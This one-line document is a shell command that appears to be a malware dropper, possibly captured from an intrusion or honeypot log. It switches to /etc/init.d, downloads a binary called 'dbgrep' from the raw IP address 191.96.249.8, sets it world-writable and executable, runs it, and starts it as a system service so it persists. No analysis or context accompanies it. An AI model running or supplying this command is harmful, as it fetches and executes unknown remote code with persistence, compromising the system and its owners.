cd /etc/init.d; wget http://191.96.249.8/dbgrep; chmod 0777 dbgrep; ./dbgrep; service dbgrep start
